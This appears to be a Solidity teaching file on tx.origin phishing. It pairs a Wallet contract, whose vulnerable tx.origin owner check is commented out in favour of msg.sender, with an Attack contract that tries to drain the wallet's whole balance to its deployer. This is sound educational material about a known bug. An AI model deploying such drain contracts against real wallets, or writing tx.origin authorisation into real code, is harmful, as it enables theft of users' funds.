// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

/*
Phising with tx.origin
- What is tx.origin?
- Contract using tx.origin
- Exploit tx.origin
- Demo
- Preventative technique
*/

/*
Alice. -> A -> B (msg.sender = A)
                 (tx.origin = Alice)
*/

contract Wallet {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function deposit() public payable {}

    /*
    Alice -> Wallet.transfer() (tx.origin = Alice)
    Alice -> Eve's malicious contract -> Wallet.transfer() (tx.origin = Alice)
    */
    function transfer(address payable _to, uint _amount) public {
        // require(tx.origin == owner, "Not owner");
        require(msg.sender == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
